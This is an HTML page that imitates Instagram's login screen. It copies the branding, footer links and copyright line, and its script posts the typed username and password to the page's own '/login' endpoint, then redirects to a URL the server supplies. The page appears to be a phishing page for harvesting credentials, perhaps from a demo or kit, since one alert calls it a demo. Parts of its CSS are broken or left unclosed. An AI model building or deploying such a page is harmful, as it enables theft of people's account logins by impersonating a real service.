        /* Loading overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .loading-overlay.active {
            display: flex;

        .spinner {
            width: 24px;
            height: 24px;
            border: 2px solid #dbdbdb;
            border-top: 2px solid #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }

        .shake {
            animation: shake 0.5s;
        }

            .form-container {

            .main-container {

            .login-box {

<body>
    <!-- Loading overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <div class="main-container">
        <!-- Phone mockup with image collage - only visible on desktop -->
        <div class="phones-container">
            <div class="phone-mockup"></div>
        </div>

        <!-- Login form -->
        <div class="form-container">
            <div class="login-box">
                <div class="instagram-logo-wrapper">
                    <i class="instagram-logo" role="img" aria-label="Instagram"></i>
                </div>
                
                <form id="loginForm" class="login-form">
                    <div class="error-message" id="errorMessage"></div>
                    
                    <div class="form-group">
                        <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required autocomplete="username" aria-label="Phone number, username, or email">
                    </div>
                    
                    <div class="form-group">
                        <input type="password" name="password" id="password" placeholder="Password" required autocomplete="current-password" aria-label="Password">
                    </div>
                    
                    <button type="submit" class="login-button" id="loginButton">Log in</button>
                </form>
                
                <div class="divider-container">
                    <div class="divider-line"></div>
                    <div class="divider-text">or</div>
                    <div class="divider-line"></div>
                </div>
                
                <div class="fb-login">
                    <span class="fb-icon"></span>
                    <span class="fb-login-text">Log in with Facebook</span>
                </div>
                
                <div class="forgot-password">
                    <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
                </div>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Sign up</a>
            </div>
            
            <div class="get-app">
                <p class="get-app-text">Get the app.</p>
                <div class="app-buttons">
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
                    </a>
                    <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt" target="_blank">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
                    </a>
                </div>
            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="https://about.meta.com/" target="_blank">Meta</a>
                <a href="https://about.instagram.com/" target="_blank">About</a>
                <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
                <a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a>
                <a href="https://help.instagram.com/" target="_blank">Help</a>
                <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
                <a href="https://privacycenter.instagram.com/policy" target="_blank">Privacy</a>
                <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
                <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
                <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
                <a href="https://www.threads.net/" target="_blank">Threads</a>
                <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a>
                <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
            </div>
            <div class="footer-bottom">
                <div class="language-selector">
                    <select>
                        <option value="en">English</option>
                        <option value="es">Español</option>
                        <option value="fr">Français</option>
                        <option value="de">Deutsch</option>
                        <option value="it">Italiano</option>
                        <option value="pt">Português (Brasil)</option>
                        <option value="ja">日本語</option>
                        <option value="ko">한국어</option>
                        <option value="zh-cn">中文(简体)</option>
                    </select>
                </div>
                <span class="footer-copyright">© 2025 Instagram from Meta</span>
            </div>
        </div>
    </footer>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const form = this;
            const button = document.getElementById('loginButton');
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const errorDiv = document.getElementById('errorMessage');
            
            // Clear previous errors
            errorDiv.style.display = 'none';
            errorDiv.textContent = '';
            
            // Show loading state
            button.textContent = 'Logging in...';
            button.disabled = true;
            document.getElementById('loadingOverlay').classList.add('active');
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        username: username,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                // Check if response is successful (status 200)
                if (response.ok && data.status === 'success') {
                    // Redirect to Instagram
                    window.location.href = data.redirect;
                } else {
                    // Show error message for wrong password or other errors
                    document.getElementById('loadingOverlay').classList.remove('active');
                    errorDiv.textContent = data.message || 'Sorry, your password was incorrect. Please double-check your password.';
                    errorDiv.style.display = 'block';
                    button.textContent = 'Log in';
                    button.disabled = false;
                    
                    // Shake animation
                    form.classList.add('shake');
                    setTimeout(() => form.classList.remove('shake'), 500);
                    
                    // Focus password field
                    document.getElementById('password').focus();
                    document.getElementById('password').select();
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loadingOverlay').classList.remove('active');
                errorDiv.textContent = 'Sorry, there was a problem. Please try again.';
                errorDiv.style.display = 'block';
                button.textContent = 'Log in';
                button.disabled = false;
            }
        });

        // Facebook login (just for show)
        document.querySelector('.fb-login').addEventListener('click', function() {
            alert('This feature is not available in this demo.');
        });
    </script>
</body>
